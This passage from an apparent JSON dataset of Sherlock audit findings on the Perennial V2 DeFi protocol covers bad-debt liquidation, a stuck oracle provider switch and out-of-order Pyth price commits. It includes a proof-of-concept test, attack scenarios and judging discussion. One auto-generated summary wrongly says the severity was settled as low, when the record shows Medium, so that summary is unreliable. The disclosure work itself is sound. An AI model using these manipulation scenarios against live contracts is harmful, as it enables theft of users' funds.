protocol and start to withdraw\n2. It is possible that bad debt is so high that any entity (\"insurance fund\") just won't have enough funds to cover it.\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```solidity\nit('panprog bad debt liquidation bankrun', async () => {\n\n    function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n        const oracleVersion = {\n        price: parse6decimal(price),\n        timestamp: timestamp,\n        valid: true,\n        }\n        oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n        oracle.status.returns([oracleVersion, nextTimestamp])\n        oracle.request.returns()\n    }\n\n    var riskParameter = {\n        maintenance: parse6decimal('0.01'),\n        takerFee: parse6decimal('0.00'),\n        takerSkewFee: 0,\n        takerImpactFee: 0,\n        makerFee: parse6decimal('0.00'),\n        makerImpactFee: 0,\n        makerLimit: parse6decimal('1000'),\n        efficiencyLimit: parse6decimal('0.2'),\n        liquidationFee: parse6decimal('0.50'),\n        minLiquidationFee: parse6decimal('10'),\n        maxLiquidationFee: parse6decimal('1000'),\n        utilizationCurve: {\n        minRate: parse6decimal('0.0'),\n        maxRate: parse6decimal('1.00'),\n        targetRate: parse6decimal('0.10'),\n        targetUtilization: parse6decimal('0.50'),\n        },\n        pController: {\n        k: parse6decimal('40000'),\n        max: parse6decimal('1.20'),\n        },\n        minMaintenance: parse6decimal('10'),\n        virtualTaker: parse6decimal('0'),\n        staleAfter: 14400,\n        makerReceiveOnly: false,\n    }\n    var marketParameter = {\n        fundingFee: parse6decimal('0.0'),\n        interestFee: parse6decimal('0.0'),\n        oracleFee: parse6decimal('0.0'),\n        riskFee: parse6decimal('0.0'),\n        positionFee: parse6decimal('0.0'),\n        maxPendingGlobal: 5,\n        maxPendingLocal: 3,\n        settlementFee: parse6decimal('0'),\n        makerRewardRate: parse6decimal('0'),\n        longRewardRate: parse6decimal('0'),\n        shortRewardRate: parse6decimal('0'),\n        makerCloseAlways: false,\n        takerCloseAlways: false,\n        closed: false,\n    }\n        \n    await market.connect(owner).updateRiskParameter(riskParameter);\n    await market.connect(owner).updateParameter(marketParameter);\n\n    setupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\n    var collateral = parse6decimal('500')\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('50.000'), 0, 0, collateral, false)\n    dsu.transferFrom.whenCalledWith(userC.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userC).update(userC.address, parse6decimal('50.000'), 0, 0, collateral, false)\n\n    var collateral = parse6decimal('10')\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, parse6decimal('10.000'), 0, collateral, false)\n\n    var info = await market.locals(user.address);\n    var infoB = await market.locals(userB.address);\n    var infoC = await market.locals(userC.address);\n    console.log(\"collateral before liquidation: \" + info.collateral + \" + \" + infoB.collateral + \" + \" + infoC.collateral + \" = \" + \n        info.collateral.add(infoB.collateral).add(infoC.collateral));\n\n    setupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\n    setupOracle('90', TIMESTAMP + 200, TIMESTAMP + 300);\n    // liquidate\n    const EXPECTED_LIQUIDATION_FEE = parse6decimal('10')\n    dsu.transfer.whenCalledWith(liquidator.address, EXPECTED_LIQUIDATION_FEE.mul(1e12)).returns(true)\n    dsu.balanceOf.whenCalledWith(market.address).returns(COLLATERAL.mul(1e12))\n    await market.connect(liquidator).update(user.address, 0, 0, 0, EXPECTED_LIQUIDATION_FEE.mul(-1), true)\n\n    setupOracle('90', TIMESTAMP + 200, TIMESTAMP + 300);\n    await market.connect(userB).update(userB.address, 0, 0, 0, 0, false)\n    await market.connect(userC).update(userC.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(user.address);\n    var infoB = await market.locals(userB.address);\n    var infoC = await market.locals(userC.address);\n    console.log(\"collateral after liquidation: \" + info.collateral + \" + \" + infoB.collateral + \" + \" + infoC.collateral + \" = \" + \n        info.collateral.add(infoB.collateral).add(infoC.collateral));\n})\n```\n\nConsole output for the code:\n```solidity\ncollateral before liquidation: 10000000 + 500000000 + 500000000 = 1010000000\ncollateral after liquidation: -100000080 + 550000000 + 550000000 = 999999920\n```\nAfter initial total deposit of $1010, in the end liquidated user will just abandon his account, and remaining user accounts have $550+$550=$1100 but only $1000 funds in the protocol to withdraw.\n\n## Code Snippet\n\nWhen account is liquidated, its collateral becomes negative, but is allowed when protected and the collateral is never reset to 0:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L497\n\nHowever, user with negative collateral will simply abandond the account and shortfall will make it impossible to withdraw for the last users in case of bank run.\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThere should be no negative collateral accounts with 0-position and no incentive to cover shortfall. When liquidated, if account is left with negative collateral, the bad debt should be added to the opposite position pnl (long position bad debt should be socialized between short position holders) or maybe to makers pnl only (socialized between makers). The account will have to be left with collateral = 0.\n\nImplementation details for such solution can be tricky due to settlement in the future (pnl is not known at the time of liquidation initiation). Possibly a 2nd step of bad debt liquidation should be added: a keeper will call the user account to socialize bad debt and get some reward for this. Although this is not the best solution, because users who close their positions before the keeper socializes the bad debt, will be able to avoid this social loss. One of the solutions for this will be to introduce delayed withdrawals and delayed socialization (like withdrawals are allowed only after 5 oracle versions and socialization is applied to all positions opened before socialization and still active or closed within 5 last oracle versions), but it will make protocol much more complicated.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> m\n\n\n\n**arjun-io**\n\nWhile we like the recommended approach it might be overly cumbersome to implement and still does not fully prevent the shortfall bank run situation. Bad debt/shortfall is necessary in Perennial and should be thoroughly minimized through correct parameter setting.",
      "summary": "\nThis bug report is about the issue of bad debt liquidation, which leaves liquidated users in a negative collateral balance and can lead to a bank run and loss of funds for the last users to withdraw. When a user is liquidated, their collateral becomes negative, but there is no incentive for anyone to repay this bad debt, and the account with negative balance is usually abandoned. This means that the negative balance is taken from the other users, but it is not socialized, so the first users to withdraw will be able to do so, but the last users will be unable to withdraw because the protocol won't have enough funds.\n\nA proof of concept was provided, demonstrating how a bad debt liquidation can lead to a bank run. The console output for the code showed that after an initial total deposit of $1010, in the end the liquidated user will abandon their account and the remaining users have $550+$550=$1100 but only $1000 funds in the protocol to withdraw.\n\nThe code snippet provided showed that when an account is liquidated, its collateral becomes negative, and is allowed when protected and the collateral is never reset to 0. This means that the user with negative collateral will simply abandon the account, and the shortfall will make it impossible to withdraw for the last users in case of a bank run.\n\nThe recommendation given was to have no negative collateral accounts with 0-position and no incentive to cover the shortfall. When liquidated, if the account is left with negative collateral, the bad debt should be added to the opposite position pnl, or maybe to makers pnl only. This would ensure that the account is left with collateral = 0. However, the implementation details for such a solution can be tricky due to settlement in the future, and it might not fully prevent the shortfall bank run situation.\n\nOverall, bad debt/shortfall is necessary in Perennial and should be thoroughly minimized through correct parameter setting.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/72",
      "tags": [],
      "finders": [
        "WATCHPUG",
        "panprog"
      ]
    },
    {
      "id": "24307",
      "title": "M-3: During oracle provider switch, if it is impossible to commit the last request of previous provider, then the oracle will get stuck (no price updates) without any possibility to fix it",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/46 \n\n## Found by \npanprog\n\nWhen the oracle provider is updated (switched to new provider), the latest status (price) returned by the oracle will come from the previous provider until the last request is commited for it, only then the price feed from the new provider will be used. However, it can happen that it's impossible to commit the latest request: for example, if pyth signature server is down for the period it is needed, or if all keepers were down for that time period, so valid price with signature for the timestamp required is not available. In this case, the oracle price will be stuck, because it will ignore new provider, but the previous provider can never finalize (commit a fresh price). It is also impossible to cancel provider switch as there is no such function. As such, the oracle price will get stuck and will never update, breaking the whole protocol with user funds stuck in the protocol.\n\n## Vulnerability Detail\n\nThe way oracle provider switch works is the following:\n1. `Oracle.update()` is called to set a new provider. This is only allowed if there is no other provider switch pending.\n2. There is a brief transition period, when both the previous provider and a new provider are active. This is to ensure that all the requests made to the previous oracle are commited before switching to a new provider. This is handled by the `Oracle._handleLatest()` function, in particular the switch to a new provider occurs only when `Oracle.latestStale()` returns true. The lines of interest to us are:\n```solidity\n        uint256 latestTimestamp = global.latest == 0 ? 0 : oracles[global.latest].provider.latest().timestamp;\n        if (uint256(oracles[global.latest].timestamp) > latestTimestamp) return false;\n```\n`latestTimestamp` - is the timestamp of last commited price for the previous provider\n`oracles[global.latest].timestamp` is the timestamp of the last requested price for the previous provider\nThe switch doesn't occur, until last commited price is equal to or after the last request timestamp for the previous provider.\n3. The functions to commit the price are in PythOracle: `commitRequested` and `commit`. \n3.1. `commitRequested` requires publish timestamp of the pyth price to be within `MIN_VALID_TIME_AFTER_VERSION`..`MAX_VALID_TIME_AFTER_VERSION` from *request time*. It is possible that pyth price with signature in this time period is not available for different reasons (pyth price feed is down, keeper was down during this period and didn't collect price and signature):\n```solidity\n        uint256 versionToCommit = versionList[versionIndex];\n        PythStructs.Price memory pythPrice = _validateAndGetPrice(versionToCommit, updateData);\n```\n`versionList` is an array of oracle request timestamps. And `_validateAndGetPrice()` filters the price within the interval specified (if it is not in the interval, it will revert):\n```solidity\n        return pyth.parsePriceFeedUpdates{value: pyth.getUpdateFee(updateDataList)}(\n            updateDataList,\n            idList,\n            SafeCast.toUint64(oracleVersion + MIN_VALID_TIME_AFTER_VERSION),\n            SafeCast.toUint64(oracleVersion + MAX_VALID_TIME_AFTER_VERSION)\n        )[0].price;\n```\n3.2. `commit` can not be done with timestamp older than the first oracle request timestamp: if any oracle request is still active, it will simply redirect to `commitRequested`:\n```solidity\n        if (versionList.length > nextVersionIndexToCommit && oracleVersion >= versionList[nextVersionIndexToCommit]) {\n            commitRequested(nextVersionIndexToCommit, updateData);\n            return;\n        }\n```\n4. All new oracle requests are directed to a **new** provider, this means that previous provider can not receive any new requests (which allows to finalize it):\n```solidity\n    function request(address account) external onlyAuthorized {\n        (OracleVersion memory latestVersion, uint256 currentTimestamp) = oracles[global.current].provider.status();\n\n        oracles[global.current].provider.request(account);\n        oracles[global.current].timestamp = uint96(currentTimestamp);\n        _updateLatest(latestVersion);\n    }\n```\n\nSo the following scenario is possible:\ntimestamp=69: oracle price is commited for timestamp=50\ntimestamp=70: user requests to open position (`Oracle.request()` is made)\ntimestamp=80: owner calls `Oracle.update()`\ntimestamp=81: pyth price signing service goes offline (or keeper goes offline)\n...\ntimestamp=120: signing service goes online again.\ntimestamp=121: another user requests to open position (`Oracle.request()` is made, directed to new provider)\ntimestamp=200: new provider's price is commited (`commitRequested` is called with timestamp=121)\n\nAt this time, `Oracle.latest()` will return price at timestamp=50. It will ignore new provider's latest commit, because previous provider last request (timestamp=70) is still not commited. Any new price requests and commits to a new provider will be ignored, but the previous provider can not be commited due to absence of prices in the valid time range. It is also not possible to change oracle for the market, because there is no such function. It is also impossible to cancel provider update and impossible to change the provider back to previous one, as all of these will revert.\n\nIt is still possible for the owner to manually whitelist some address to call `request()` for the previous provider. However, this situation provides even worse result. While the latest version for the previous provider will now be later than the last request, so it will let the oracle switch to new provider, however `oracle.status()` will briefly return invalid oracle version, because it will return oracle version at the timestamp = last request before the provider switch, which will be invalid (the new request will be after that timestamp):\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/Oracle.sol#L103\n\nThis can be abused by some user who can backrun the previous provider oracle commit (or commit himself) and use the invalid oracle returned by `status()` (oracle version with price = 0). Market doesn't expect the oracle status to return invalid price (it is expected to be always valid), so it will use this invalid price as if it's a normal price = 0, which will totally break the market:\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L574-L577\n\nSo if the oracle provider switch becomes stuck, there is no way out and the market will become stale, not allowing any user to withdraw the funds.\n\n## Impact\n\nSwitching oracle provider can make the oracle stuck and stop updating new prices. This will mean the market will become stale and will revert on all requests from user, disallowing to withdraw funds, bricking the contract entirely.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/Oracle.sol#L112-L113\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThere are multiple possible ways to fix this. For example, allow to finalize previous provider if the latest commit from the new provider is newer than the latest commit from the previous provider by `GRACE_PERIOD` seconds. Or allow PythOracle to `commit` directly (instead of via `commitRequested`) if the commit oracleVersion is newer than the last request by `GRACE_PERIOD` seconds.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> m\n\n\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/58",
      "summary": "\nThis bug report discusses an issue with the Oracle provider switch in the Perennial protocol, which is a decentralized protocol for trading derivatives. During the switch, if the last request of the previous provider cannot be committed, then the oracle will become stuck and will no longer update prices. This will cause the whole protocol to break down, with user funds stuck in the protocol.\n\nThe way the Oracle provider switch works is that when the Oracle.update() function is called to set a new provider, a brief transition period occurs in order to ensure that all requests made to the previous oracle are committed before switching to the new provider. This is handled by the Oracle._handleLatest() function which checks that the last commited price is equal to or after the last request timestamp for the previous provider. The functions to commit the price are in PythOracle: commitRequested and commit.\n\nHowever, it can happen that the last request cannot be committed due to various reasons such as the Pyth price feed being down or the keeper being down during the period. In this case, the Oracle price will be stuck and will never update, breaking the whole protocol with user funds stuck in the protocol. It is also not possible to change the provider back to the previous one as it will revert.\n\nA possible fix for this issue is to allow the PythOracle to commit directly if the commit oracleVersion is newer than the last request by a certain grace period. This fix has been implemented and can be seen in the pull request: https://github.com/equilibria-xyz/perennial-v2/pull/58.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/46",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "24306",
      "title": "M-2: PythOracle `commit()` function doesn't require (nor stores) pyth price publish timestamp to be after the previous commit's publish timestamp, which makes it possible to manipulate price to unfairly liquidate users and possible stealing protocol funds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/44 \n\n## Found by \npanprog\n\nPythOracle allows any user to commit non-requested oracle version. However, it doesn't verify pyth price publish timestamp to be in order (like `commitRequested` does). This makes it possible to commit prices out of order, potentially leading to price manipulations allowing to unfairly liquidate users or steal funds from the protocol.\n\n## Vulnerability Detail\n\nPythOracle `commitRequested()` has the following check:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L138-L139\n\nHowever, `commit()` doesn't have the same check. This allows malicious user to commit prices out of order, which can potentially lead to price manipulation attacks and unfair liquidation of users or loss of protocol funds.\n\nFor example, the following scenario is possible:\nTimestamp = 100: Alice requests to open 1 ETH long position with $10 collateral\nTimestamp = 113: pyth price = $980\nTimestamp = 114: pyth price = $990\nTimestamp = 115: pyth price = $1000\nTimestamp = 116: Keeper commits requested price = $1000 (with publish timestamp = 115)\nTimestamp = 117: Malicious user Bob commits oracle version 101 with price = $980 (publish timestamp = 113) and immediately liquidates Alice.\n\nEven though the current price is $1000, Alice is liquidated using the price which is *earlier* than the price when Alice position is opened, which is unfair liquidation. The other more complex scenarios are also possible for malicious Bob to liquidate itself to steal protocol funds.\n\n## Impact\n\nUnfair liquidation as described in the scenario above or possible loss of protocol funds.\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd publish time check and store publish time in `PythOracle.commit()`:\n```solidity\n    function commit(uint256 oracleVersion, bytes calldata updateData) external payable {\n        // Must be before the next requested version to commit, if it exists\n        // Otherwise, try to commit it as the next request version to commit\n        if (versionList.length > nextVersionIndexToCommit && oracleVersion >= versionList[nextVersionIndexToCommit]) {\n            commitRequested(nextVersionIndexToCommit, updateData);\n            return;\n        }\n\n+        if (pythPrice.publishTime <= _lastCommittedPublishTime) revert PythOracleNonIncreasingPublishTimes();\n+        _lastCommittedPublishTime = pythPrice.publishTime;\n\n        PythStructs.Price memory pythPrice = _validateAndGetPrice(oracleVersion, updateData);\n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> m\n\n\n\n**Emedudu**\n\nEscalate\n\nThis is an invalid issue.\n>Malicious user Bob commits oracle version 101 with price = $980 (publish timestamp = 113) and immediately liquidates Alice.\n\nHow is Bob malicious? He committed the more recent price.\n>Timestamp = 116: Keeper commits requested price = $1000 (with publish timestamp = 115)\n\nIf this price is used(which was requested at timestamp 100, when current timestamp is 115), it means that protocol is using a 15 seconds stale price.\nIt is better(and an expected behaviour) when Bob commits a more recent price(price at timestamp 101) because now, Protocol is using a less stale price(14 seconds stale).\nSo it is fair to liquidate Alice because even though the most recent price does not favour her, that's the rules.\n\n\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This is an invalid issue.\n> >Malicious user Bob commits oracle version 101 with price = $980 (publish timestamp = 113) and immediately liquidates Alice.\n> \n> How is Bob malicious? He committed the more recent price.\n> >Timestamp = 116: Keeper commits requested price = $1000 (with publish timestamp = 115)\n> \n> If this price is used(which was requested at timestamp 100, when current timestamp is 115), it means that protocol is using a 15 seconds stale price.\n> It is better(and an expected behaviour) when Bob commits a more recent price(price at timestamp 101) because now, Protocol is using a less stale price(14 seconds stale).\n> So it is fair to liquidate Alice because even though the most recent price does not favour her, that's the rules.\n> \n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**panprog**\n\nEscalate\n\nThis is a valid issue. Let me go into example in more details to explain. A few terms to better understand process:\n- `oracle version` - the timestamp keeper commits the price to. It doesn't mean the price *at this* timestamp. It means the price used to settle positions at this timestamp.\n- `pyth publish timestamp` - the timestamp of a price published and signed in the pyth network (actual time the price is observed). `publish timestamp` must come 12-15 seconds after `oracle version` (these are example settings in perennial tests).\n\nTimestamp = 100: Alice requests to open 1 ETH long position with $10 collateral. Oracle request is created (with `oracle version` = 100, meaning only `publish prices` in 112..115 range can be commited)\nTimestamp = 113: `pyth publish price` = $980\nTimestamp = 114: `pyth publish price` = $990\nTimestamp = 115: `pyth publish price` = $1000\nTimestamp = 116: Keeper commits requested price = $1000 (`oracle version` = 100, `publish timestamp` = 115)\nTimestamp = 117: Malicious user Bob commits (unrequested) `oracle version` = 101 with price = $980, `publish timestamp` = 113 and immediately liquidates Alice.\n\nWhat happens is:\n`oracle version` = 100 has `publish timestamp` = 115\n`oracle version` = 101 has `publish timestamp` = 113\n\nThis breaks invariant that publish timestamps must increase when oracle version increases.\n\nSo first position is opened using price $1000 (with `publish timestamp` = 115), then it is liquidated using the `publish timestamp = 113`, which is an earlier price than the price of when position was opened, which is unfair liquidation.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This is a valid issue. Let me go into example in more details to explain. A few terms to better understand process:\n> - `oracle version` - the timestamp keeper commits the price to. It doesn't mean the price *at this* timestamp. It means the price used to settle positions at this timestamp.\n> - `pyth publish timestamp` - the timestamp of a price published and signed in the pyth network (actual time the price is observed). `publish timestamp` must come 12-15 seconds after `oracle version` (these are example settings in perennial tests).\n> \n> Timestamp = 100: Alice requests to open 1 ETH long position with $10 collateral. Oracle request is created (with `oracle version` = 100, meaning only `publish prices` in 112..115 range can be commited)\n> Timestamp = 113: `pyth publish price` = $980\n> Timestamp = 114: `pyth publish price` = $990\n> Timestamp = 115: `pyth publish price` = $1000\n> Timestamp = 116: Keeper commits requested price = $1000 (`oracle version` = 100, `publish timestamp` = 115)\n> Timestamp = 117: Malicious user Bob commits (unrequested) `oracle version` = 101 with price = $980, `publish timestamp` = 113 and immediately liquidates Alice.\n> \n> What happens is:\n> `oracle version` = 100 has `publish timestamp` = 115\n> `oracle version` = 101 has `publish timestamp` = 113\n> \n> This breaks invariant that publish timestamps must increase when oracle version increases.\n> \n> So first position is opened using price $1000 (with `publish timestamp` = 115), then it is liquidated using the `publish timestamp = 113`, which is an earlier price than the price of when position was opened, which is unfair liquidation.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Emedudu**\n\nThis assumption is predicated on the idea that there can be a rapid and significant change in the ETH/USD price, such as a $10 change as demonstrated in the example. Can we substantiate this assumption with historical data, demonstrating that the price of ETH can indeed fluctuate by $10 within a second, or even within 3 seconds?\n\nBesides, it's crucial for the protocol to utilize the price from the most recent oracle version. This underscores the importance for users to maintain healthy positions. Referring to the example Watson provided, Alice should not let her position teeter on the brink of liquidation.\n\nSo again, Bob is not acting maliciously. He is diligently fulfilling his role as a keeper, which involves updating oracle versions. He happened upon a careless trader, Alice, with an unhealthy position and executed a liquidation. This action benefits the protocol by reducing the number of unhealthy positions.\n\n\n**Minh-Trng**\n\nWhile it is true that `commitRequested` enforces publish time to increase monotonically, while `commit` doesnt, the example shows how Alice has at one point in those 3 seconds been be below her liquidation point, so its absolutely fine (and beneficial for the protocol) for her to be liquidated.\n\nBob has done a better job at playing the keeper than the other keeper\n\n**panprog**\n\n> While it is true that `commitRequested` enforces publish time to increase monotonically, while `commit` doesnt, the example shows how Alice has at one point in those 3 seconds been be below her liquidation point, so its absolutely fine (and beneficial for the protocol) for her to be liquidated.\n\nNo, this is not true. If the price of $980 was commited first, then Alice position would be opened at a price of $980 and will not be liquidatable. If Alice was opened at a price of $990, then she also won't be liquidatable.\n\n> This assumption is predicated on the idea that there can be a rapid and significant change in the ETH/USD price, such as a $10 change as demonstrated in the example. Can we substantiate this assumption with historical data, demonstrating that the price of ETH can indeed fluctuate by $10 within a second, or even within 3 seconds?\n\n1. Even 0.01% of a price change is enough to liquidate the account. Yes, the user may be careless with leverage, however this doesn't make this liquidation fair. I chose more extreme numbers just to better demonstrate the scenario.\n2. 3 seconds is just an example, it's a protocol setting and can be higher\n3. Here is an extreme example to better understand why such liquidation is unfair. If the publish timestamp window is, say, 200 seconds long and the price starts dropping sharply from $1000 to $980. User expects the price to keep dropping, so he opens a short position at close to max leverage (so that a price move of $20 will get it liquidated). The price keeps falling sharply to $960. The position is opened at a price of $960 (end of 200 seconds interval) and immediately liquidated at a price of $980 (start of 200 seconds interval). I don't think any reasonable user expects his position to be liquidated using prices which were well before the opening of the position.\n\nSo even with 3-seconds time interval and much smaller price change magnitude, the same scenario is still possible and is still unfair. The published (observed) prices must come in the same order they're observed from pyth, they can not go in a random order.\n\n**Emedudu**\n\n>Even 0.01% of a price change is enough to liquidate the account. Yes, the user may be careless with leverage, however this doesn't make this liquidation fair. I chose more extreme numbers just to better demonstrate the scenario.\n\nWhy should a user leave his position to be liquidatable when there is a price change of 0.01%? This shows that the position is indeed unhealthy. One thing about oracles is that they return approximate values, and have little deviation from other oracles' values. So no reasonable trader will make her position liquidatable on a 0.01% price change.\n\n>3 seconds is just an example, it's a protocol setting and can be higher\n\nFrom what I can see, they are CONSTANTS: [MIN_VALID_TIME_AFTER_VERSION](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L17) and [MAX_VALID_TIME_AFTER_VERSION](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L20)\n\n>Here is an extreme example to better understand why such liquidation is unfair. If the publish timestamp window is, say, 200 seconds long and the price starts dropping sharply from $1000 to $980. User expects the price to keep dropping, so he opens a short position at close to max leverage (so that a price move of $20 will get it liquidated). The price keeps falling sharply to $960. The position is opened at a price of $960 (end of 200 seconds interval) and immediately liquidated at a price of $980 (start of 200 seconds interval). I don't think any reasonable user expects his position to be liquidated using prices which were well before the opening of the position\n\nThis seems unrealistic\n\n\n\n**Minh-Trng**\n\nA core assumption of this issue is that a user opens a position close to the liquidation price and/or in a highly volatile period without enough buffer till liquidation, so that even a price deviation within 2 seconds would liquidate them. this is clearly a user mistake rather than a protocol error. And thats why a medium severity is imo not justified. \n\nA user does not know the oracle prices 12-15 seconds into the future, so they would not choose which price to be filled at and be mindful of having enough margin. The example might as well go like this:\n\nTimestamp = 113: pyth publish price = $980\nTimestamp = 114: pyth publish price = $990\nTimestamp = 115: pyth publish price = $1000\nTimestamp = 116: pyth publish price = $990\nTimestamp = 117: pyth publish price = $980\n\nIn this case Alice might get filled at t=115 and get liquidated at t=117 and there is no one to blame but her.\n\nTo sum up, the issue is hypothetically possible but requires a careless user AND enough volatility within 2 seconds time span\n\n**panprog**\n\n> To sum up, the issue is hypothetically possible but requires a careless user AND enough volatility within 2 seconds time span\n\nYes, it's unlikely but possible, thus should be a valid medium.\n\n**Emedudu**\n\nSeverity should be LOW because likelihood is low and impact is low\n\n\n\n\n**panprog**\n\n> Severity should be LOW because likelihood is low and impact is low\n\nImpact is unfair liquidation, so it's high. For example, if the price starts dropping quickly -> every second the price will be less than or equal to previous second's price, in such situation opening short position at max leverage can be valid strategy for the user expecting continuaton of the price fall, and being liquidated at earlier price is also extremely unfair.\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/80\n\n**141345**\n\nMedium seems appropriate.\n\nAs per the discussion, it is plausible to commit prices out of order and cause loss, but with several conditions:\n- limited time span\n- high volatility\n- the position is already on the border of liquidation\n\n\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nConsidering this issue a valid medium based on the above discussion and the comment from Lead Judge\n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [panprog](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/44/#issuecomment-1694337978): accepted\n- [Emedudu](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/44/#issuecomment-1694206797): rejected",
      "summary": "\nA bug has been identified in the PythOracle `commit()` function in the Sherlock-Audit's 2023-07-perennial-judging project. The bug allows any user to commit non-requested oracle versions without verifying the pyth price publish timestamp to be in order, as `commitRequested` does. This makes it possible for malicious users to commit prices out of order, potentially leading to price manipulations and unfair liquidation of users or loss of protocol funds. \n\nFor example, if the publish timestamp window is 200 seconds long and the price starts dropping sharply from $1000 to $980, a user may open a short position at close to max leverage, expecting the price to keep dropping. The position is opened at a price of $960 (end of 200 seconds interval) and immediately liquidated at a price of $980 (start of 200 seconds interval). This is an unfair liquidation as the price used to liquidate the position is earlier than the price when the position was opened. \n\nThe bug has been discussed among the team and it has been concluded that the severity should be considered as low, as the likelihood is low and the impact is low. However, it is important for users to maintain healthy positions and for the protocol to utilize the price from the most recent oracle version.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/44",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "24305",
      "title": "M-1: `_unwrap` in `MultiInvoker.sol` can revert every time in some cases which will make the users not being able to `_liquidate` or `_withdraw` with `warp` to true",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/22 \n\n## Found by \nVagner\n`_withdraw` makes some wrong assumptions which could lead to reverts all the time if `DSU` protocol will be in debt.\n## Vulnerability Detail\nThe function `_withdraw` is called in `_liquidate`, `_vaultUpdate` and  `_update`, and if the `wrap` is set to true, which will be all the time in the case of `_liquidate`, it will try to call `_unwrap` https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L262\nAfter that `_unwrap` will check if the address of `batcher` is 0, which can be the case if it is not set up in the constructor, or if the `balanceOf`  USDC of `batcher` is less than the amount intended to withdraw \nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L287\nand if any of that will be true it will try to call the `redeem` function on `reserve` with the intended amount \nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L288\nand then transfers the `amount` to the `receiver`\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L289\nThe problem relies in the fact that the protocol assumes that the `amount` that is used in `redeem` function will always be equal to the `amount` of USDC returned, which is not the case.\nAs can be seen in the code of the `reserve` here the `redeemAmount` is a calculation that depends on the `redeemPrice` which depends on the debt of the protocol \nhttps://github.com/emptysetsquad/emptyset/blob/c5d876fbd8ff1fac988898b77ef5461971f9fdd2/protocol/contracts/src/reserve/ReserveComptroller.sol#L125\nThe whole calculation of `redeemPrice` is done depending of the `reserveRatio` of the Protocol \nhttps://github.com/emptysetsquad/emptyset/blob/c5d876fbd8ff1fac988898b77ef5461971f9fdd2/protocol/contracts/src/reserve/ReserveComptroller.sol#L81-L84\n so in the case where DSU will make some bad decisions and it will be in debt the `redeemAmount` calculated will be less than the actual amount inserted into `redeem` function, and that `redeemAmount` will be the one actual transferred to the `MultiInvoker.sol`\nhttps://github.com/emptysetsquad/emptyset/blob/c5d876fbd8ff1fac988898b77ef5461971f9fdd2/protocol/contracts/src/reserve/ReserveComptroller.sol#L130\nSo when `_unwrap` will try to transfers the same amount of USDC 